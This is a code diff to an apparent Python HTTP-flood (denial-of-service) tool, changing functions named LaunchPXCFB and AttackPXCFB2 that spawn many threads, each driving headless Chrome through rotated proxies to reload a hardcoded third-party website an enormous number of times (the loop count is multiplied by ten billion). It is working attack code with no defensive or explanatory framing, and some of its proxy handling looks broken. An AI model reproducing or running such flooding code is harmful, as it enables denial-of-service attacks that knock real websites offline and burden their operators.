@@ -13,7 +13,9 @@ from sys import stdout
 from colorama import Fore, init
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -583,8 +585,7 @@ def LaunchPXCFB(url, th, t):
 
         for i in range(int(th)):
             try:
-                proxy = random.choice(proxies).strip().split(":")
-                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxy,th))
+                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxies,th))
                 thd.start()
 
             except:
@@ -595,11 +596,12 @@ def LaunchPXCFB(url, th, t):
         
 
 def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
+        proxy = random.choice(proxies).strip().split(":")
+    
         try:
-                from selenium import webdriver
-                from selenium.webdriver.chrome.service import Service
-                from selenium.webdriver.chrome.options import Options
+               
                 # Proxy configuration
+                
                 proxy = f"http://{proxies[0]}:{proxies[1]}"
 
                 # Set up Chrome options for headless mode and proxy
@@ -608,7 +610,7 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
                 chrome_options.add_argument("--no-sandbox")  # Disable sandboxing
                 chrome_options.add_argument("--disable-dev-shm-usage")  # Overcome limited resource problems
 
-                chrome_options.add_argument(f'--proxy-server={proxy}')
+                # chrome_options.add_argument(f'--proxy-server={proxy}')
 
                 # Specify the path to the Chrome binary
                 chrome_options.binary_location = '/usr/bin/google-chrome'  # Update with actual path if different
@@ -622,7 +624,7 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
 
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
-                for _ in range(int(th)):
+                for _ in range(int(th)*10000000000):
                     driver.get(url)
                     # Get the page source
                     page_source = driver.title
@@ -632,7 +634,7 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
 
 
         except Exception as e:
-            print('falid--------------',proxy)
+            print('falid--------------',proxy,e)
 
 
 #region CFPRO
